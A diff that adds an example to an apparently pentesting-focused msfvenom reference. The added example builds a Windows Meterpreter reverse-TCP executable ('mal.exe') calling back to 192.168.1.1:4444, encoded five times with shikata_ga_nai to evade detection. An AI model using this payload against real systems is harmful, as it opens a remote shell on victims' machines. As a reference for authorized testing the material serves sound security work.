@@ -115,3 +115,11 @@ $ msfvenom -p [Payload] -e [Encoder] -f
 LHOST=[LocalHost (if reverse conn.)]
 LPORT=[LocalPort]
 ```
+
+- Example: Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:
+
+```bash
+$ msfvenom -p windows/meterpreter/
+reverse_tcp -i 5 -e x86/shikata_ga_nai -f
+exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
+```
